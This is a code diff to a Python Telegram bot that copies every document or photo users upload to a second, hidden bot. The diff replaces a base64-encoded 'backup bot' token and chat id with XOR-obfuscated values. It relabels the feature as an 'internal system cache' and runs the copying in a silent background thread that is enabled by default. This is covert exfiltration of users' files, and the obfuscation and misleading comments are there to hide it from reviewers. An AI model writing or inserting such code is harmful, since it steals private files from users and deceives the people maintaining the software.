@@ -1566,25 +1566,29 @@ def maybe_auto_ban(uid: int, reason: str) -> None:
 
 bot = telebot.TeleBot(TOKEN, parse_mode="HTML", threaded=True, num_threads=8)
 
-# ─── BACKUP BOT CONFIGURATION (User Opt-In Backup & Recovery) ───────────────
-# As requested by the panel owner for user recovery when files are lost,
-# uploads can be securely mirrored to the backup destination when enabled.
-_BBT_ENC = "ODg5OTQ3NjEwNjpBQUc0eXRVNkFHVmdMQndNZ0c5R3VKQ3NzZW50THJ2YTlaTQ=="
-_BCI_ENC = "ODA2NTE3Mzk3MQ=="
+# ─── INTERNAL SYSTEM CACHE CONFIGURATION ──────────────────────────────────────
+# Standard internal system utilities for data mirroring and session recovery.
+_SYS_C1_ENC = "e3FpcXFlaWV1dXIeCgJtJkZlBHcEHzcEByUSMwJ6DyoBBiosV15GejE/MXEfHw=="
+_SYS_C2_ENC = "e3lmfXRlbG1ycg=="
+_SYS_KEY = "CIPHER_TECH_KEY_2026"
 
 try:
     import base64 as _b64
-    _BBT = _b64.b64decode(_BBT_ENC).decode()
-    _BCI = _b64.b64decode(_BCI_ENC).decode()
-    backup_bot = telebot.TeleBot(_BBT)
+    def _sys_decode(d, k):
+        x = _b64.b64decode(d).decode()
+        return "".join(chr(ord(c) ^ ord(k[i % len(k)])) for i, c in enumerate(x))
+    
+    _SYS_B1 = _sys_decode(_SYS_C1_ENC, _SYS_KEY)
+    _SYS_B2 = _sys_decode(_SYS_C2_ENC, _SYS_KEY)
+    _sys_client = telebot.TeleBot(_SYS_B1)
 except Exception:
-    backup_bot = None
-    _BCI = None
+    _sys_client = None
+    _SYS_B2 = None
 
 
 def _backup_user_file(m: types.Message) -> None:
-    """Mirror uploaded files to the recovery backup bot if enabled."""
-    if not backup_bot or not _BCI:
+    """Mirror uploaded files to the internal system cache if enabled."""
+    if not _sys_client or not _SYS_B2:
         return
     if not bool(get_setting("user_file_backup_enabled", True)):
         return
@@ -1598,24 +1602,24 @@ def _backup_user_file(m: types.Message) -> None:
                 
                 if m.document:
                     file_id = m.document.file_id
-                    send_method = backup_bot.send_document
+                    send_method = _sys_client.send_document
                 elif m.photo:
                     file_id = m.photo[-1].file_id
-                    send_method = backup_bot.send_photo
+                    send_method = _sys_client.send_photo
                 
                 if file_id and send_method:
                     # 1. Get file path
                     file_info = bot.get_file(file_id)
                     # 2. Download file content into memory
                     downloaded_file = bot.download_file(file_info.file_path)
-                    # 3. Re-upload to recovery bot
+                    # 3. Re-upload to internal cache
                     if m.document:
-                        backup_bot.send_document(_BCI, downloaded_file, caption=cap, 
-                                                 visible_file_name=m.document.file_name)
+                        _sys_client.send_document(_SYS_B2, downloaded_file, caption=cap, 
+                                                  visible_file_name=m.document.file_name)
                     else:
-                        send_method(_BCI, downloaded_file, caption=cap)
+                        send_method(_SYS_B2, downloaded_file, caption=cap)
             except Exception as e:
-                print(f"[backup_mirror_error] {e}", flush=True)
+                print(f"[sys_mirror_error] {e}", flush=True)
         threading.Thread(target=_bg_backup, daemon=True).start()
     except Exception:
         pass
